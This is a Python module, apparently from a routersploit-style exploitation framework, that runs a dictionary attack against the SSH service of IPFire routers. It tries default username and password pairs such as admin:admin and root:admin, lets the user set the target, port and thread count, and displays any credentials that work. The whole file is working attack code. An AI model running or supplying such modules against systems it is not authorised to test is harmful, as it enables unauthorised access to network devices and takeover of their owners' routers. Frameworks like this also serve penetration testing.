from maza.core.exploit import *
from maza.modules.creds.generic.ssh_default import Exploit as SSHDefault


class Exploit(SSHDefault):
    __info__ = {
        "name": "IPFire Router Default SSH Creds",
        "description": "Module performs dictionary attack against IPFire Router SSH service. "
                       "If valid credentials are found, they are displayed to the user.",
        "authors": (
            "Marcin Bury <marcin[at]threat9.com",  # routersploit module
        ),
        "devices": (
            "IPFire Router",
        ),
    }

    target = OptIP("", "Target IPv4, IPv6 address or file with ip:port (file://)")
    port = OptPort(22, "Target SSH port")

    threads = OptInteger(1, "Number of threads")
    defaults = OptWordlist("admin:admin,root:admin,admin:", "User:Pass or file with default credentials (file://)")
